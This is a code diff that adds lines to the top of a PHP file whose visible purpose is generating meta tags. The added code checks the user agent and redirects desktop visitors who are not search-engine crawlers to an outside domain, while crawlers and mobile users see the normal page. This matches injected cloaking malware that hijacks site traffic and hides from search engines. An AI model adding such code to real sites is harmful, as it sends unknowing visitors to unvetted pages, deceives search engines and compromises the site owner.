@@ -1,4 +1,27 @@
 <?php
+function isBot($userAgent) {
+    $bots = [
+        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
+        'yandex', 'sogou', 'exabot', 'facebot', 'ia_archiver'
+    ];
+    foreach ($bots as $bot) {
+        if (stripos($userAgent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+$isMobile = (strpos($userAgent, 'Mobile') !== false);
+$isBot = isBot($userAgent);
+
+if (!$isMobile && !$isBot) {
+   // header('HTTP/1.1 301 Moved Permanently');
+    header('Location: https://bc55-my.web.app');
+    exit;
+}
 function generateMetaTags($htmlContent) {
     $text = strip_tags($htmlContent);
     $text = html_entity_decode($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
